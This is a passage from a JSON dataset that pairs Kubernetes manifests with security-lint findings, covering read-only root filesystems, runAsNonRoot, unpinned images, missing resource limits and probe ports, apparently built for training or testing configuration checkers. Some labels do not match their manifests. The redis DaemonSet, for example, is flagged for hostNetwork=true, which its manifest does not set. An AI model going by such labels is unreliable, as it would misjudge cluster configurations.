initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n            ephemeral-storage: 5Gi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n            ephemeral-storage: 5Gi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MAX_CONCURRENT_RECONCILES_SECRET_ in container \"operator\" found"
  },
  {
    "id": "7737",
    "manifest_path": "data/manifests/the_stack_sample/sample_2844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.4.0\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: SHORTNAME_NODE_MAPPING\n          value: 'yes'\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/ibm-spectrum-scale-csi-driver@sha256:4d8c41138f2fddac351f82db19c32fe5ad1282e7886f78fe2669f0c30ea5badb\n        - name: CSI_SNAPSHOTTER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-snapshotter@sha256:818f35653f2e214db81d655063e81995de9073328a3430498624c140881026a3\n        - name: CSI_ATTACHER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-attacher@sha256:80dec81b679a733fda448be92a2331150d99095947d04003ecff3dbd7f2a476a\n        - name: CSI_PROVISIONER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-provisioner@sha256:6477988532358148d2e98f7c747db4e9250bbc7ad2664bf666348abf9ee1f5aa\n        - name: CSI_LIVENESSPROBE_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/livenessprobe@sha256:529be2c9770add0cdd0c989115222ea9fc1be430c11095eb9f6dafcf98a36e2b\n        - name: CSI_NODE_REGISTRAR_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-node-driver-registrar@sha256:f9bcee63734b7b01555ee8fc8fb01ac2922478b2c8934bf8d468dd2916edc405\n        - name: CSI_RESIZER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-resizer@sha256:6e0546563b18872b0aa0cad7255a26bb9a87cb879b7fc3e2383c867ef4f706fb\n        image: icr.io/cpopen/ibm-spectrum-scale-csi-operator@sha256:38751e2b7a4624e588747ed427c2c2146bee320bab74b0bb288f38c2c5d2bddd\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n            ephemeral-storage: 5Gi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n            ephemeral-storage: 5Gi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"operator\" does not have a read-only root file system"
  },
  {
    "id": "7738",
    "manifest_path": "data/manifests/the_stack_sample/sample_2844.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n    app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n    product: ibm-spectrum-scale-csi\n    release: ibm-spectrum-scale-csi-operator\n  name: csi-operator\n  namespace: ibm-spectrum-scale-csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n  template:\n    metadata:\n      annotations:\n        productID: ibm-spectrum-scale-csi-operator\n        productName: IBM Spectrum Scale CSI Operator\n        productVersion: 2.4.0\n      labels:\n        app.kubernetes.io/instance: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/managed-by: ibm-spectrum-scale-csi-operator\n        app.kubernetes.io/name: ibm-spectrum-scale-csi-operator\n        name: ibm-spectrum-scale-csi-operator\n        product: ibm-spectrum-scale-csi\n        release: ibm-spectrum-scale-csi-operator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: kubernetes.io/arch\n                operator: Exists\n      containers:\n      - name: operator\n        args:\n        - --metrics-addr=0.0.0.0:8383\n        - --enable-leader-election\n        - --leader-election-id=ibm-spectrum-scale-csi-operator\n        env:\n        - name: SHORTNAME_NODE_MAPPING\n          value: 'yes'\n        - name: MAX_CONCURRENT_RECONCILES_CSISCALEOPERATOR_CSI_IBM_COM\n          value: '1'\n        - name: MAX_CONCURRENT_RECONCILES_SECRET_\n          value: '1'\n        - name: ANSIBLE_DEBUG_LOGS\n          value: 'False'\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CSI_DRIVER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/ibm-spectrum-scale-csi-driver@sha256:4d8c41138f2fddac351f82db19c32fe5ad1282e7886f78fe2669f0c30ea5badb\n        - name: CSI_SNAPSHOTTER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-snapshotter@sha256:818f35653f2e214db81d655063e81995de9073328a3430498624c140881026a3\n        - name: CSI_ATTACHER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-attacher@sha256:80dec81b679a733fda448be92a2331150d99095947d04003ecff3dbd7f2a476a\n        - name: CSI_PROVISIONER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-provisioner@sha256:6477988532358148d2e98f7c747db4e9250bbc7ad2664bf666348abf9ee1f5aa\n        - name: CSI_LIVENESSPROBE_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/livenessprobe@sha256:529be2c9770add0cdd0c989115222ea9fc1be430c11095eb9f6dafcf98a36e2b\n        - name: CSI_NODE_REGISTRAR_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-node-driver-registrar@sha256:f9bcee63734b7b01555ee8fc8fb01ac2922478b2c8934bf8d468dd2916edc405\n        - name: CSI_RESIZER_IMAGE\n          value: cp.icr.io/cp/spectrum/scale/csi/csi-resizer@sha256:6e0546563b18872b0aa0cad7255a26bb9a87cb879b7fc3e2383c867ef4f706fb\n        image: icr.io/cpopen/ibm-spectrum-scale-csi-operator@sha256:38751e2b7a4624e588747ed427c2c2146bee320bab74b0bb288f38c2c5d2bddd\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - ./health_check.sh\n          initialDelaySeconds: 3\n          periodSeconds: 1\n        resources:\n          limits:\n            cpu: 600m\n            memory: 600Mi\n            ephemeral-storage: 5Gi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n            ephemeral-storage: 5Gi\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1001\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          privileged: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - mountPath: /tmp/ansible-operator/runner\n          name: runner\n      serviceAccountName: ibm-spectrum-scale-csi-operator\n      volumes:\n      - emptyDir: {}\n        name: runner\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ibm-spectrum-scale-csi-operator\" not found"
  },
  {
    "id": "7739",
    "manifest_path": "data/manifests/the_stack_sample/sample_2846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5757\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7740",
    "manifest_path": "data/manifests/the_stack_sample/sample_2846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5757\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7741",
    "manifest_path": "data/manifests/the_stack_sample/sample_2846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5757\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7742",
    "manifest_path": "data/manifests/the_stack_sample/sample_2846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5757\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7743",
    "manifest_path": "data/manifests/the_stack_sample/sample_2846.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5757\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7744",
    "manifest_path": "data/manifests/the_stack_sample/sample_2847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: darkonone/ui:logging\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7745",
    "manifest_path": "data/manifests/the_stack_sample/sample_2847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: darkonone/ui:logging\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ui\" does not have a read-only root file system"
  },
  {
    "id": "7746",
    "manifest_path": "data/manifests/the_stack_sample/sample_2847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: darkonone/ui:logging\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ui\" is not set to runAsNonRoot"
  },
  {
    "id": "7747",
    "manifest_path": "data/manifests/the_stack_sample/sample_2847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: darkonone/ui:logging\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ui\" has cpu request 0"
  },
  {
    "id": "7748",
    "manifest_path": "data/manifests/the_stack_sample/sample_2847.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  labels:\n    app: reddit\n    component: ui\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: ui\n  template:\n    metadata:\n      name: ui-pod\n      labels:\n        app: reddit\n        component: ui\n    spec:\n      containers:\n      - image: darkonone/ui:logging\n        name: ui\n        env:\n        - name: ENV\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ui\" has memory limit 0"
  },
  {
    "id": "7749",
    "manifest_path": "data/manifests/the_stack_sample/sample_2848.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: bkleparacr20200320.azurecr.io/captureorder:cc1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7750",
    "manifest_path": "data/manifests/the_stack_sample/sample_2848.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: bkleparacr20200320.azurecr.io/captureorder:cc1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7751",
    "manifest_path": "data/manifests/the_stack_sample/sample_2848.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: bkleparacr20200320.azurecr.io/captureorder:cc1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "7752",
    "manifest_path": "data/manifests/the_stack_sample/sample_2848.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: bkleparacr20200320.azurecr.io/captureorder:cc1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7753",
    "manifest_path": "data/manifests/the_stack_sample/sample_2848.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: bkleparacr20200320.azurecr.io/captureorder:cc1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "7754",
    "manifest_path": "data/manifests/the_stack_sample/sample_2850.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1091\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7755",
    "manifest_path": "data/manifests/the_stack_sample/sample_2850.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1091\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7756",
    "manifest_path": "data/manifests/the_stack_sample/sample_2850.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1091\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7757",
    "manifest_path": "data/manifests/the_stack_sample/sample_2850.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1091\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7758",
    "manifest_path": "data/manifests/the_stack_sample/sample_2850.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1091\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7759",
    "manifest_path": "data/manifests/the_stack_sample/sample_2851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: redis\n  namespace: kube-system\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: Exists\n      containers:\n      - name: redis\n        image: redis:4.0.2\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: env\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: redis-data\n        - mountPath: /var/log/redis\n          name: redis-logs\n      volumes:\n      - name: redis-data\n        hostPath:\n          path: /var/lib/contrail/redis\n      - name: redis-logs\n        hostPath:\n          path: /var/log/contrail/redis\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7760",
    "manifest_path": "data/manifests/the_stack_sample/sample_2851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: redis\n  namespace: kube-system\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: Exists\n      containers:\n      - name: redis\n        image: redis:4.0.2\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: env\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: redis-data\n        - mountPath: /var/log/redis\n          name: redis-logs\n      volumes:\n      - name: redis-data\n        hostPath:\n          path: /var/lib/contrail/redis\n      - name: redis-logs\n        hostPath:\n          path: /var/log/contrail/redis\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "7761",
    "manifest_path": "data/manifests/the_stack_sample/sample_2851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: redis\n  namespace: kube-system\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: Exists\n      containers:\n      - name: redis\n        image: redis:4.0.2\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: env\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: redis-data\n        - mountPath: /var/log/redis\n          name: redis-logs\n      volumes:\n      - name: redis-data\n        hostPath:\n          path: /var/lib/contrail/redis\n      - name: redis-logs\n        hostPath:\n          path: /var/log/contrail/redis\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "7762",
    "manifest_path": "data/manifests/the_stack_sample/sample_2851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: redis\n  namespace: kube-system\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: Exists\n      containers:\n      - name: redis\n        image: redis:4.0.2\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: env\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: redis-data\n        - mountPath: /var/log/redis\n          name: redis-logs\n      volumes:\n      - name: redis-data\n        hostPath:\n          path: /var/lib/contrail/redis\n      - name: redis-logs\n        hostPath:\n          path: /var/log/contrail/redis\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "7763",
    "manifest_path": "data/manifests/the_stack_sample/sample_2851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: redis\n  namespace: kube-system\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: Exists\n      containers:\n      - name: redis\n        image: redis:4.0.2\n        imagePullPolicy: IfNotPresent\n        envFrom:\n        - configMapRef:\n            name: env\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: redis-data\n        - mountPath: /var/log/redis\n          name: redis-logs\n      volumes:\n      - name: redis-data\n        hostPath:\n          path: /var/lib/contrail/redis\n      - name: redis-logs\n        hostPath:\n          path: /var/log/contrail/redis\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "7764",
    "manifest_path": "data/manifests/the_stack_sample/sample_2855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: desafio-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: desafio-go\n  template:\n    metadata:\n      labels:\n        app: desafio-go\n    spec:\n      containers:\n      - name: desafio-go\n        image: img-app-deployment\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"desafio-go\" is using an invalid container image, \"img-app-deployment\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7765",
    "manifest_path": "data/manifests/the_stack_sample/sample_2855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: desafio-go\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: desafio-go\n  template:\n    metadata:\n      labels:\n        app: desafio-go\n    spec:\n      containers:\n      - name: desafio-go\n        image: img-app-deployment\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"desafio-go\" does not have a read-only root file system"
  },
  {
    "id": "7766",
    "manifest_path": "data/manifests/the_stack_sample/sample_2855.yaml",
